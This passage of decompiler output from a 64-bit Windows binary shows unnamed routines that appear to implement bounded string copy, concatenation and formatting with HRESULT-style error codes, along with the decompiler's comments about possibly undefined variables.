// 1400037A1: variable 'v17' is possibly undefined
// 1400037A1: variable 'v18' is possibly undefined
// 140003740: using guessed type __int64 var_18[3];

//----- (0000000140003A60) ----------------------------------------------------
__int64 __fastcall sub_140003A60(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _BYTE *a4,
        _BYTE *a5,
        _QWORD *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        __int64 *a11,
        unsigned int a12)
{
  __int64 v13; // [rsp+0h] [rbp-38h]
  __int64 v14; // [rsp+8h] [rbp-30h]
  __int64 v15; // [rsp+10h] [rbp-28h]
  __int64 v16; // [rsp+18h] [rbp-20h]

  if ( a3 <= 0x7FFFFFFF )
    return sub_140003AB0(a1, a2, a3, a4, a3, a5, v13, v14, v15, v16, a6, a11, a12);
  else
    return 2147942487LL;
}
// 140003A96: variable 'v13' is possibly undefined
// 140003A96: variable 'v14' is possibly undefined
// 140003A96: variable 'v15' is possibly undefined
// 140003A96: variable 'v16' is possibly undefined

//----- (0000000140003AB0) ----------------------------------------------------
__int64 __fastcall sub_140003AB0(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        _BYTE *a4,
        __int64 a5,
        _BYTE *a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        _QWORD *a11,
        __int64 *a12,
        unsigned int Size)
{
  int v15; // r13d
  __int64 v16; // r12
  __int64 v17; // rdi
  __int64 v18; // rdi
  _BYTE *v19; // rdi
  _BYTE *v20; // rax
  __int64 v21; // rcx
  __int64 v22; // rax
  _BYTE *v24; // rax
  _BYTE *v25; // rax
  __int64 v26; // rcx
  __int64 v27; // rcx
  __int64 v28; // rbp
  char v29; // cl

  v15 = -2147024809;
  if ( Size > 0x1FFF )
    goto LABEL_14;
  if ( (Size & 0x100) == 0 )
  {
    if ( a3 )
    {
      v16 = 0LL;
      v17 = 0LL;
      while ( a4[v17] )
      {
        if ( a3 == ++v17 )
          goto LABEL_15;
      }
      v16 = a3 - v17;
      v19 = &a4[v17];
LABEL_36:
      if ( (Size & 0x100) != 0 )
      {
        v24 = &unk_14000D378;
        if ( a6 )
          v24 = a6;
        if ( v16 && !v19 )
        {
          v25 = 0LL;
          v15 = -2147024809;
          v26 = 0LL;
LABEL_68:
          if ( v15 >= 0 || v15 == -2147024774 )
            goto LABEL_73;
LABEL_16:
          if ( a4 && v15 < 0 )
          {
            if ( (Size & 0x400) != 0 )
            {
              memset(v19, a3, Size);
              v20 = a4;
              v21 = a3;
              if ( (_BYTE)Size )
              {
                if ( !a3 )
                  goto LABEL_28;
                v20 = &a4[a3 - 1];
                *v20 = 0;
                v21 = 1LL;
              }
            }
            else
            {
              v20 = v19;
              v21 = v16;
            }
            if ( a3 && (Size & 0x800) != 0 )
            {
              *a4 = 0;
              v19 = a4;
              v16 = a3;
            }
            else
            {
              v19 = v20;
              v16 = v21;
            }
          }
LABEL_28:
          if ( v15 < 0 && v15 != -2147024774 )
            return (unsigned int)v15;
          goto LABEL_30;
        }
      }
      else
      {
        v24 = a6;
      }
      if ( v16 )
      {
        v27 = 0LL;
        while ( 1 )
        {
          v28 = v27;
          v29 = v24[v27];
          if ( !v29 )
            break;
          v19[v28] = v29;
          v27 = v28 + 1;
          if ( v16 == v28 + 1 )
          {
            v15 = -2147024774;
            goto LABEL_62;
          }
        }
        v15 = 0;
        if ( (Size & 0x200) != 0 )
          memset(v19, a3, Size);
LABEL_62:
        v25 = &v19[v28];
        v19[v28] = 0;
        v26 = v16 - v28;
      }
      else
      {
        if ( !*v24 )
        {
          v26 = 0LL;
          v25 = v19;
          v15 = 0;
LABEL_73:
          v19 = v25;
          v16 = v26;
          goto LABEL_16;
        }
        v15 = -2147024774;
        if ( !v19 )
          v15 = -2147024809;
        v26 = 0LL;
        v25 = v19;
      }
      if ( v19 && v15 < 0 && (Size & 0x1000) != 0 && v16 )
      {
        *v19 = 0;
        v25 = v19;
        v26 = v16;
      }
      goto LABEL_68;
    }
LABEL_14:
    v16 = 0LL;
LABEL_15:
    v19 = a4;
    goto LABEL_16;
  }
  if ( a4 )
  {
    if ( !a3 )
      goto LABEL_14;
    v16 = 0LL;
    v18 = 0LL;
    while ( a4[v18] )
    {
      if ( a3 == ++v18 )
        goto LABEL_15;
    }
    v22 = a3 - v18;
    v19 = &a4[v18];
  }
  else
  {
    v15 = -2147024809;
    v19 = 0LL;
    v22 = 0LL;
    v16 = 0LL;
    if ( a3 | a5 )
      goto LABEL_28;
  }
  if ( !a6 )
    a6 = &unk_14000D378;
  v16 = v22;
  if ( a3 )
    goto LABEL_36;
  if ( *a6 )
  {
    v15 = -2147024774;
    if ( !a4 )
      v15 = -2147024809;
    goto LABEL_16;
  }
  v15 = 0;
LABEL_30:
  if ( a11 )
    *a11 = v19;
  if ( a12 )
    *a12 = v16;
  return (unsigned int)v15;
}
// 140003C2C: conditional instruction was optimized away because rdx.8!=0

//----- (0000000140003D80) ----------------------------------------------------
__int64 __fastcall sub_140003D80(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _WORD *a4,
        _WORD *a5,
        _QWORD *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        _QWORD *a11,
        unsigned int a12)
{
  __int64 v13; // [rsp+0h] [rbp-38h]
  __int64 v14; // [rsp+8h] [rbp-30h]
  __int64 v15; // [rsp+10h] [rbp-28h]
  __int64 v16; // [rsp+18h] [rbp-20h]

  if ( a3 <= 0x7FFFFFFF )
    return sub_140003DD0(a1, a2, a3, a4, 2 * a3, a5, v13, v14, v15, v16, a6, a11, a12);
  else
    return 2147942487LL;
}
// 140003DB7: variable 'v13' is possibly undefined
// 140003DB7: variable 'v14' is possibly undefined
// 140003DB7: variable 'v15' is possibly undefined
// 140003DB7: variable 'v16' is possibly undefined

//----- (0000000140003DD0) ----------------------------------------------------
__int64 __fastcall sub_140003DD0(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _WORD *a4,
        __int64 a5,
        _WORD *a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        _QWORD *a11,
        _QWORD *a12,
        unsigned int Size)
{
  __int64 v13; // rdi
  _WORD *v14; // rsi
  int v15; // ebp
  __int64 v17; // [rsp+0h] [rbp-78h]
  __int64 v18; // [rsp+8h] [rbp-70h]
  __int64 v19; // [rsp+10h] [rbp-68h]
  __int64 v20; // [rsp+18h] [rbp-60h]
  __int64 v21; // [rsp+40h] [rbp-38h] BYREF
  __int64 v22[6]; // [rsp+48h] [rbp-30h] BYREF

  v13 = a3;
  v14 = a4;
  v22[0] = (__int64)a4;
  v21 = 0LL;
  v15 = -2147024809;
  if ( Size > 0x1FFF )
    goto LABEL_24;
  if ( (Size & 0x100) != 0 )
  {
    if ( a4 )
    {
      if ( !a3 )
        goto LABEL_24;
      while ( *a4 )
      {
        ++a4;
        if ( !--a3 )
          goto LABEL_24;
      }
      v22[0] = (__int64)a4;
      v21 = a3;
    }
    else
    {
      v15 = -2147024809;
      if ( a3 | a5 )
        goto LABEL_33;
      a3 = 0LL;
      a4 = 0LL;
    }
    if ( !a6 )
      a6 = &unk_14000D37A;
    if ( !v13 )
      goto LABEL_15;
LABEL_23:
    v15 = sub_140002BE0(
            v13,
            (__int64)v14,
            a3,
            a4,
            (a5 & 1) + 2 * a3,
            a6,
            v17,
            v18,
            v19,
            v20,
            v22,
            &v21,
            Size & 0xFFFFF3FF);
    goto LABEL_24;
  }
  if ( !a3 )
    goto LABEL_24;
  while ( *a4 )
  {
    ++a4;
    if ( !--a3 )
      goto LABEL_24;
  }
  v22[0] = (__int64)a4;
  v21 = a3;
  if ( v13 )
    goto LABEL_23;
LABEL_15:
  if ( *a6 )
  {
    v15 = -2147024774;
    if ( !v14 )
      v15 = -2147024809;
LABEL_24:
    if ( !v14 || v15 >= 0 )
      goto LABEL_33;
    if ( (Size & 0x400) != 0 )
    {
      memset((void *)v13, (int)v14, Size);
      if ( !(_BYTE)Size )
      {
        v22[0] = (__int64)v14;
        v21 = v13;
        if ( !v13 )
          goto LABEL_33;
LABEL_31:
        if ( (Size & 0x800) != 0 )
        {
          v22[0] = (__int64)v14;
          v21 = v13;
          *v14 = 0;
        }
LABEL_33:
        if ( v15 < 0 && v15 != -2147024774 )
          return (unsigned int)v15;
        goto LABEL_35;
      }
      if ( !v13 )
        goto LABEL_33;
      v22[0] = (__int64)&v14[v13 - 1];
      v21 = 1LL;
      *(_WORD *)v22[0] = 0;
    }
    if ( !v13 )
      goto LABEL_33;
    goto LABEL_31;
  }
  v15 = 0;
LABEL_35:
  if ( a11 )
    *a11 = v22[0];
  if ( a12 )
    *a12 = v21;
  return (unsigned int)v15;
}
// 140003EEE: variable 'v17' is possibly undefined
// 140003EEE: variable 'v18' is possibly undefined
// 140003EEE: variable 'v19' is possibly undefined
// 140003EEE: variable 'v20' is possibly undefined
// 140003DD0: using guessed type __int64 var_30[6];

//----- (0000000140003FC0) ----------------------------------------------------
__int64 __fastcall sub_140003FC0(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _BYTE *a4,
        _BYTE *a5,
        _QWORD *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        _QWORD *a11,
        unsigned int a12)
{
  __int64 result; // rax
  __int64 v13; // [rsp+0h] [rbp-48h]
  __int64 v14; // [rsp+8h] [rbp-40h]
  __int64 v15; // [rsp+10h] [rbp-38h]
  __int64 v16; // [rsp+18h] [rbp-30h]
  __int64 v17; // [rsp+38h] [rbp-10h] BYREF

  v17 = 0LL;
  result = 2147942487LL;
  if ( a3 <= 0x7FFFFFFF )
    result = sub_140003AB0(a1, (__int64)a11, a3, a4, a3, a5, v13, v14, v15, v16, a6, &v17, a12);
  if ( a11 )
  {
    if ( (_DWORD)result == -2147024774 || (int)result >= 0 )
      *a11 = v17;
  }
  return result;
}
// 140004001: variable 'v13' is possibly undefined
// 140004001: variable 'v14' is possibly undefined
// 140004001: variable 'v15' is possibly undefined
// 140004001: variable 'v16' is possibly undefined

//----- (0000000140004030) ----------------------------------------------------
__int64 __fastcall sub_140004030(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _WORD *a4,
        _WORD *a5,
        _QWORD *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        _QWORD *a11,
        unsigned int a12)
{
  char v12; // si
  __int64 result; // rax
  __int64 v14; // [rsp+0h] [rbp-58h]
  __int64 v15; // [rsp+8h] [rbp-50h]
  __int64 v16; // [rsp+10h] [rbp-48h]
  __int64 v17; // [rsp+18h] [rbp-40h]
  __int64 v18[3]; // [rsp+40h] [rbp-18h] BYREF

  v12 = a3;
  v18[0] = 0LL;
  result = 2147942487LL;
  if ( !HIDWORD(a3) )
    result = sub_140003DD0((__int64)a11, a3, a3 >> 1, a4, a3, a5, v14, v15, v16, v17, a6, v18, a12);
  if ( a11 )
  {
    if ( (_DWORD)result == -2147024774 || (int)result >= 0 )
      *a11 = (v12 & 1) + 2 * v18[0];
  }
  return result;
}
// 140004081: variable 'v14' is possibly undefined
// 140004081: variable 'v15' is possibly undefined
// 140004081: variable 'v16' is possibly undefined
// 140004081: variable 'v17' is possibly undefined
// 140004030: using guessed type __int64 var_18[3];

//----- (00000001400040C0) ----------------------------------------------------
__int64 __fastcall sub_1400040C0(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5, __int64 a6)
{
  __int64 result; // rax
  __int64 v7; // r9
  __int64 v8; // rsi
  char v9; // al
  __int64 v10; // r10
  __int64 v11; // r11
  _BYTE *v12; // rdx

  result = 2147942487LL;
  if ( (unsigned __int64)(a3 - 1) <= 0x7FFFFFFE )
  {
    while ( *a4 )
    {
      ++a4;
      if ( !--a3 )
        return result;
    }
    if ( a6 )
    {
      v7 = a6 - 1;
      v8 = 0LL;
      while ( 1 )
      {
        v9 = *(_BYTE *)(a5 + v8);
        if ( !v9 )
          break;
        a4[v8] = v9;
        v10 = a3 - 1;
        v11 = v8 + 1;
        if ( v7 != v8 )
        {
          ++v8;
          if ( --a3 )
            continue;
        }
        a4 += v11;
        goto LABEL_13;
      }
      a4 += v8;
      v10 = a3;
    }
    else
    {
      v10 = 1LL;
    }
LABEL_13:
    v12 = a4 - 1;
    if ( v10 )
      v12 = a4;
    result = 2147942522LL;
    if ( v10 )
      result = 0LL;
    *v12 = 0;
  }
  return result;
}

//----- (0000000140004160) ----------------------------------------------------
__int64 __fastcall sub_140004160(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5, __int64 a6)
{
  __int64 result; // rax
  __int64 v7; // r9
  __int64 v8; // rsi
  char v9; // al
  __int64 v10; // r10
  __int64 v11; // r11
  _BYTE *v12; // rdx

  result = 2147942487LL;
  if ( a3 )
  {
    while ( *a4 )
    {
      ++a4;
      if ( !--a3 )
        return result;
    }
    if ( a6 )
    {
      v7 = a6 - 1;
      v8 = 0LL;
      while ( 1 )
      {
        v9 = *(_BYTE *)(a5 + v8);
        if ( !v9 )
          break;
        a4[v8] = v9;
        v10 = a3 - 1;
        v11 = v8 + 1;
        if ( v7 != v8 )
        {
          ++v8;
          if ( --a3 )
            continue;
        }
        a4 += v11;
        goto LABEL_13;
      }
      a4 += v8;
      v10 = a3;
    }
    else
    {
      v10 = 1LL;
    }
LABEL_13:
    v12 = a4 - 1;
    if ( v10 )
      v12 = a4;
    result = 2147942522LL;
    if ( v10 )
      result = 0LL;
    *v12 = 0;
  }
  return result;
}

//----- (0000000140004320) ----------------------------------------------------
__int64 __fastcall sub_140004320(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5, __int64 a6)
{
  __int64 result; // rax
  __int64 v7; // r9
  __int64 v8; // rsi
  char v9; // al
  __int64 v10; // r10
  __int64 v11; // r11
  _BYTE *v12; // rdx

  result = 2147942487LL;
  if ( (unsigned __int64)(a3 - 1) <= 0x7FFFFFFE )
  {
    while ( *a4 )
    {
      ++a4;
      if ( !--a3 )
        return result;
    }
    if ( a6 )
    {
      v7 = a6 - 1;
      v8 = 0LL;
      while ( 1 )
      {
        v9 = *(_BYTE *)(a5 + v8);
        if ( !v9 )
          break;
        a4[v8] = v9;
        v10 = a3 - 1;
        v11 = v8 + 1;
        if ( v7 != v8 )
        {
          ++v8;
          if ( --a3 )
            continue;
        }
        a4 += v11;
        goto LABEL_13;
      }
      a4 += v8;
      v10 = a3;
    }
    else
    {
      v10 = 1LL;
    }
LABEL_13:
    v12 = a4 - 1;
    if ( v10 )
      v12 = a4;
    result = 2147942522LL;
    if ( v10 )
      result = 0LL;
    *v12 = 0;
  }
  return result;
}

//----- (0000000140004460) ----------------------------------------------------
__int64 __fastcall sub_140004460(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        char *a4,
        _BYTE *a5,
        unsigned __int64 a6,
        int a7,
        int a8,
        int a9,
        int a10,
        char **a11,
        _QWORD *a12,
        unsigned int a13)
{
  __int64 v14; // [rsp+0h] [rbp-48h]
  __int64 v15; // [rsp+8h] [rbp-40h]
  __int64 v16; // [rsp+10h] [rbp-38h]
  __int64 v17; // [rsp+18h] [rbp-30h]

  if ( a3 <= 0x7FFFFFFF )
    return sub_1400044B0(a1, a2, a3, a4, a3, a5, v14, v15, v16, v17, a6, a11, a12, a13);
  else
    return 2147942487LL;
}
// 1400044A3: variable 'v14' is possibly undefined
// 1400044A3: variable 'v15' is possibly undefined
// 1400044A3: variable 'v16' is possibly undefined
// 1400044A3: variable 'v17' is possibly undefined

//----- (00000001400044B0) ----------------------------------------------------
__int64 __fastcall sub_1400044B0(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        char *a4,
        __int64 a5,
        _BYTE *a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        unsigned __int64 a11,
        char **a12,
        _QWORD *a13,
        unsigned int Size)
{
  char *v14; // rdi
  char *v15; // rsi
  int v16; // ebp
  __int64 v18; // [rsp+0h] [rbp-78h]
  __int64 v19; // [rsp+8h] [rbp-70h]
  __int64 v20; // [rsp+10h] [rbp-68h]
  __int64 v21; // [rsp+18h] [rbp-60h]
  __int64 v22; // [rsp+40h] [rbp-38h] BYREF
  char *v23; // [rsp+48h] [rbp-30h] BYREF

  v14 = (char *)a3;
  v15 = a4;
  v23 = a4;
  v22 = 0LL;
  v16 = -2147024809;
  if ( a11 > 0x7FFFFFFF || Size > 0x1FFF )
  {
LABEL_17:
    if ( !v15 )
      goto LABEL_26;
LABEL_18:
    if ( v16 >= 0 )
      goto LABEL_26;
    if ( (Size & 0x400) != 0 )
    {
      memset(v14, (int)v15, Size);
      if ( !(_BYTE)Size )
      {
        v23 = v15;
        v22 = (__int64)v14;
        if ( !v14 )
          goto LABEL_26;
LABEL_24:
        if ( (Size & 0x800) != 0 )
        {
          v23 = v15;
          v22 = (__int64)v14;
          *v15 = 0;
        }
LABEL_26:
        if ( v16 < 0 && v16 != -2147024774 )
          return (unsigned int)v16;
        goto LABEL_28;
      }
      if ( !v14 )
        goto LABEL_26;
      v23 = &v14[(_QWORD)v15 - 1];
      v22 = 1LL;
      *v23 = 0;
    }
    if ( !v14 )
      goto LABEL_26;
    goto LABEL_24;
  }
  if ( (Size & 0x100) != 0 )
  {
    if ( a4 )
    {
      if ( !a3 )
        goto LABEL_17;
      while ( *a4 )
      {
        ++a4;
        if ( !--a3 )
          goto LABEL_17;
      }
      v23 = a4;
      v22 = a3;
    }
    else
    {
      v16 = -2147024809;
      if ( a3 | a5 )
        goto LABEL_26;
      a3 = 0LL;
      a4 = 0LL;
    }
    if ( !a6 )
      a6 = &unk_14000D378;
    if ( v14 )
      goto LABEL_16;
  }
  else
  {
    if ( !a3 )
      goto LABEL_17;
    while ( *a4 )
    {
      ++a4;
      if ( !--a3 )
        goto LABEL_17;
    }
    v23 = a4;
    v22 = a3;
    if ( v14 )
    {
LABEL_16:
      v16 = sub_140003240(
              (__int64)v14,
              (__int64)v15,
              a3,
              a4,
              a3,
              a6,
              v18,
              v19,
              v20,
              v21,
              a11,
              &v23,
              &v22,
              Size & 0xFFFFF3FF);
      goto LABEL_17;
    }
  }
  v16 = 0;
  if ( a11 && *a6 )
  {
    v16 = -2147024774;
    if ( !v15 )
    {
      v16 = -2147024809;
      goto LABEL_26;
    }
    goto LABEL_18;
  }
LABEL_28:
  if ( a12 )
    *a12 = v23;
  if ( a13 )
    *a13 = v22;
  return (unsigned int)v16;
}
// 1400045BA: variable 'v18' is possibly undefined
// 1400045BA: variable 'v19' is possibly undefined
// 1400045BA: variable 'v20' is possibly undefined
// 1400045BA: variable 'v21' is possibly undefined

//----- (00000001400046C0) ----------------------------------------------------
__int64 __fastcall sub_1400046C0(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _WORD *a4,
        _WORD *a5,
        unsigned __int64 a6,
        int a7,
        int a8,
        int a9,
        int a10,
        _QWORD *a11,
        _QWORD *a12,
        unsigned int a13)
{
  __int64 v14; // [rsp+0h] [rbp-48h]
  __int64 v15; // [rsp+8h] [rbp-40h]
  __int64 v16; // [rsp+10h] [rbp-38h]
  __int64 v17; // [rsp+18h] [rbp-30h]

  if ( a3 <= 0x7FFFFFFF )
    return sub_140004720(a1, (__int64)a11, a3, a4, 2 * a3, a5, v14, v15, v16, v17, a6, a11, a12, a13);
  else
    return 2147942487LL;
}
// 140004705: variable 'v14' is possibly undefined
// 140004705: variable 'v15' is possibly undefined
// 140004705: variable 'v16' is possibly undefined
// 140004705: variable 'v17' is possibly undefined

//----- (0000000140004720) ----------------------------------------------------
__int64 __fastcall sub_140004720(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        _WORD *a4,
        __int64 a5,
        _WORD *a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        unsigned __int64 a11,
        _QWORD *a12,
        _QWORD *a13,
        unsigned int Size)
{
  __int64 v14; // rdi
  _WORD *v15; // rsi
  int v16; // ebp
  __int64 v18; // [rsp+0h] [rbp-78h]
  __int64 v19; // [rsp+8h] [rbp-70h]
  __int64 v20; // [rsp+10h] [rbp-68h]
  __int64 v21; // [rsp+18h] [rbp-60h]
  __int64 v22; // [rsp+40h] [rbp-38h] BYREF
  __int64 v23[6]; // [rsp+48h] [rbp-30h] BYREF

  v14 = a3;
  v15 = a4;
  v23[0] = (__int64)a4;
  v22 = 0LL;
  v16 = -2147024809;
  if ( a11 > 0x7FFFFFFF || Size > 0x1FFF )
  {
LABEL_17:
    if ( !v15 )
      goto LABEL_26;
LABEL_18:
    if ( v16 >= 0 )
      goto LABEL_26;
    if ( (Size & 0x400) != 0 )
    {
      memset((void *)v14, (int)v15, Size);
      if ( !(_BYTE)Size )
      {
        v23[0] = (__int64)v15;
        v22 = v14;
        if ( !v14 )
          goto LABEL_26;
LABEL_24:
        if ( (Size & 0x800) != 0 )
        {
          v23[0] = (__int64)v15;
          v22 = v14;
          *v15 = 0;
        }
LABEL_26:
        if ( v16 < 0 && v16 != -2147024774 )
          return (unsigned int)v16;
        goto LABEL_28;
      }
      if ( !v14 )
        goto LABEL_26;
      v23[0] = (__int64)&v15[v14 - 1];
      v22 = 1LL;
      *(_WORD *)v23[0] = 0;
    }
    if ( !v14 )
      goto LABEL_26;
    goto LABEL_24;
  }
  if ( (Size & 0x100) != 0 )
  {
    if ( a4 )
    {
      if ( !a3 )
        goto LABEL_17;
      while ( *a4 )
      {
        ++a4;
        if ( !--a3 )
          goto LABEL_17;
      }
      v23[0] = (__int64)a4;
      v22 = a3;
    }
    else
    {
      v16 = -2147024809;
      if ( a3 | a5 )
        goto LABEL_26;
      a3 = 0LL;
      a4 = 0LL;
    }
    if ( !a6 )
      a6 = &unk_14000D37A;
    if ( v14 )
      goto LABEL_16;
  }
  else
  {
    if ( !a3 )
      goto LABEL_17;
    while ( *a4 )
    {
      ++a4;
      if ( !--a3 )
        goto LABEL_17;
    }
    v23[0] = (__int64)a4;
    v22 = a3;
    if ( v14 )
    {
LABEL_16:
      v16 = sub_1400034B0(
              v14,
              (__int64)v15,
              a3,
              a4,
              (a5 & 1) + 2 * a3,
              a6,
              v18,
              v19,
              v20,
              v21,
              a11,
              v23,
              &v22,
              Size & 0xFFFFF3FF);
      goto LABEL_17;
    }
  }
  v16 = 0;
  if ( a11 && *a6 )
  {
    v16 = -2147024774;
    if ( !v15 )
    {
      v16 = -2147024809;
      goto LABEL_26;
    }
    goto LABEL_18;
  }
LABEL_28:
  if ( a12 )
    *a12 = v23[0];
  if ( a13 )
    *a13 = v22;
  return (unsigned int)v16;
}
// 140004839: variable 'v18' is possibly undefined
// 140004839: variable 'v19' is possibly undefined
// 140004839: variable 'v20' is possibly undefined
// 140004839: variable 'v21' is possibly undefined
// 140004720: using guessed type __int64 var_30[6];

//----- (0000000140004950) ----------------------------------------------------
__int64 __fastcall sub_140004950(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        char *a4,
        _BYTE *a5,
        unsigned __int64 a6,
        int a7,
        int a8,
        int a9,
        int a10,
        char **a11,
        _QWORD *a12,
        unsigned int a13)
{
  __int64 result; // rax
  __int64 v14; // [rsp+0h] [rbp-58h]
  __int64 v15; // [rsp+8h] [rbp-50h]
  __int64 v16; // [rsp+10h] [rbp-48h]
  __int64 v17; // [rsp+18h] [rbp-40h]
  __int64 v18; // [rsp+48h] [rbp-10h] BYREF

  v18 = 0LL;
  result = 2147942487LL;
  if ( a3 <= 0x7FFFFFFF )
    result = sub_1400044B0(a1, (__int64)a12, a3, a4, a3, a5, v14, v15, v16, v17, a6, a11, &v18, a13);
  if ( a12 )
  {
    if ( (_DWORD)result == -2147024774 || (int)result >= 0 )
      *a12 = v18;
  }
  return result;
}
// 1400049A4: variable 'v14' is possibly undefined
// 1400049A4: variable 'v15' is possibly undefined
// 1400049A4: variable 'v16' is possibly undefined
// 1400049A4: variable 'v17' is possibly undefined

//----- (00000001400049D0) ----------------------------------------------------
__int64 __fastcall sub_1400049D0(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _WORD *a4,
        _WORD *a5,
        unsigned __int64 a6,
        int a7,
        int a8,
        int a9,
        int a10,
        _QWORD *a11,
        _QWORD *a12,
        unsigned int a13)
{
  char v13; // si
  __int64 result; // rax
  __int64 v15; // [rsp+0h] [rbp-58h]
  __int64 v16; // [rsp+8h] [rbp-50h]
  __int64 v17; // [rsp+10h] [rbp-48h]
  __int64 v18; // [rsp+18h] [rbp-40h]
  __int64 v19[3]; // [rsp+40h] [rbp-18h] BYREF

  v13 = a3;
  v19[0] = 0LL;
  result = 2147942487LL;
  if ( !HIDWORD(a3) )
    result = sub_140004720((__int64)a12, a3, a3 >> 1, a4, a3, a5, v15, v16, v17, v18, a6 >> 1, a11, v19, a13);
  if ( a12 )
  {
    if ( (_DWORD)result == -2147024774 || (int)result >= 0 )
      *a12 = (v13 & 1) + 2 * v19[0];
  }
  return result;
}
// 140004A31: variable 'v15' is possibly undefined
// 140004A31: variable 'v16' is possibly undefined
// 140004A31: variable 'v17' is possibly undefined
// 140004A31: variable 'v18' is possibly undefined
// 1400049D0: using guessed type __int64 var_18[3];

//----- (0000000140004A70) ----------------------------------------------------
__int64 __fastcall sub_140004A70(__int64 a1, __int64 a2, __int64 a3, char *a4)
{
  size_t v4; // rsi
  __int64 result; // rax
  int v7; // eax
  __int64 v8; // rcx

  v4 = a3 - 1;
  result = 2147942487LL;
  if ( (unsigned __int64)(a3 - 1) <= 0x7FFFFFFE )
  {
    v7 = vsnprintf(a4, v4, (const char *const)(a3 - 1), a4);
    if ( v7 < 0 || (v8 = v7, v4 < v7) )
    {
      a4[v4] = 0;
      return 2147942522LL;
    }
    else
    {
      result = 0LL;
      if ( v4 == v8 )
        a4[v4] = 0;
    }
  }
  return result;
}

//----- (0000000140004AC0) ----------------------------------------------------
__int64 __fastcall sub_140004AC0(__int64 a1, __int64 a2, __int64 a3, char *a4)
{
  unsigned __int64 v5; // rsi
  int v6; // eax
  __int64 v7; // rcx
  __int64 result; // rax

  if ( !a3 )
    return 2147942487LL;
  v5 = a3 - 1;
  v6 = vsnprintf(a4, a3 - 1, (const char *const)(a3 - 1), a4);
  if ( v6 < 0 || (v7 = v6, v5 < v6) )
  {
    a4[v5] = 0;
    return 2147942522LL;
  }
  else
  {
    result = 0LL;
    if ( v5 == v7 )
      a4[v5] = 0;
  }
  return result;
}

//----- (0000000140004B10) ----------------------------------------------------
__int64 __fastcall sub_140004B10(__int64 a1, __int64 a2, size_t a3, wchar_t *a4)
{
  unsigned __int64 v4; // rbx
  __int64 result; // rax
  int v8; // eax
  __int64 v9; // rcx

  v4 = a3 - 1;
  result = 2147942487LL;
  if ( a3 - 1 <= 0x7FFFFFFE )
  {
    v8 = vsnwprintf(a4, a3, (const wchar_t *)(a3 - 1), (va_list)a4);
    if ( v8 < 0 || (v9 = v8, v4 < v8) )
    {
      a4[a3 - 1] = 0;
      return 2147942522LL;
    }
    else
    {
      result = 0LL;
      if ( v4 == v9 )
        a4[a3 - 1] = 0;
    }
  }
  return result;
}

//----- (0000000140004B70) ----------------------------------------------------
__int64 __fastcall sub_140004B70(__int64 a1, __int64 a2, size_t a3, wchar_t *a4)
{
  unsigned __int64 v6; // rbx
  int v7; // eax
  __int64 v8; // rcx
  __int64 result; // rax

  if ( !a3 )
    return 2147942487LL;
  v6 = a3 - 1;
  v7 = vsnwprintf(a4, a3, (const wchar_t *)(a3 - 1), (va_list)a4);
  if ( v7 < 0 || (v8 = v7, v6 < v7) )
  {
    a4[a3 - 1] = 0;
    return 2147942522LL;
  }
  else
  {
    result = 0LL;
    if ( v6 == v8 )
      a4[a3 - 1] = 0;
  }
  return result;
}

//----- (0000000140004BD0) ----------------------------------------------------
__int64 __fastcall sub_140004BD0(__int64 a1, __int64 a2, __int64 a3, char *a4)
{
  size_t v4; // rsi
  __int64 result; // rax
  int v7; // eax
  __int64 v8; // rcx

  v4 = a3 - 1;
  result = 2147942487LL;
  if ( (unsigned __int64)(a3 - 1) <= 0x7FFFFFFE )
  {
    v7 = vsnprintf(a4, v4, (const char *const)(a3 - 1), a4);
    if ( v7 < 0 || (v8 = v7, v4 < v7) )
    {
      a4[v4] = 0;
      return 2147942522LL;
    }
    else
    {
      result = 0LL;
      if ( v4 == v8 )
        a4[v4] = 0;
    }
  }
  return result;
}

//----- (0000000140004C20) ----------------------------------------------------
__int64 __fastcall sub_140004C20(__int64 a1, __int64 a2, unsigned __int64 a3, wchar_t *a4)
{
  __int64 result; // rax
  size_t v5; // rsi
  unsigned __int64 v7; // rbx
  int v8; // eax
  __int64 v9; // rcx

  result = 2147942487LL;
  if ( !HIDWORD(a3) )
  {
    v5 = a3 >> 1;
    if ( a3 >> 1 )
    {
      v7 = v5 - 1;
      v8 = vsnwprintf(a4, v5, (const wchar_t *)(v5 - 1), (va_list)a4);
      if ( v8 < 0 || (v9 = v8, v7 < v8) )
      {
        a4[v5 - 1] = 0;
        return 2147942522LL;
      }
      else
      {
        result = 0LL;
        if ( v7 == v9 )
          a4[v5 - 1] = 0;
      }
    }
  }
  return result;
}

//----- (0000000140004C80) ----------------------------------------------------
__int64 __fastcall sub_140004C80(__int64 a1, __int64 a2, unsigned __int64 a3, char *a4)
{
  __int64 result; // rax
  const char *v6; // rsi
  int v7; // eax
  const char *v8; // rcx

  result = 2147942487LL;
  if ( a3 <= 0x7FFFFFFF )
  {
    if ( a3 )
    {
      v6 = (const char *)(a3 - 1);
      v7 = vsnprintf(a4, (const size_t)v6, v6, a4);
      if ( v7 < 0 || (v8 = (const char *)v7, (unsigned __int64)v6 < v7) )
      {
        v6[(_QWORD)a4] = 0;
        return 2147942522LL;
      }
      else
      {
        result = 0LL;
        if ( v6 == v8 )
          v6[(_QWORD)a4] = 0;
      }
    }
    else
    {
      return 2147942487LL;
    }
  }
  return result;
}

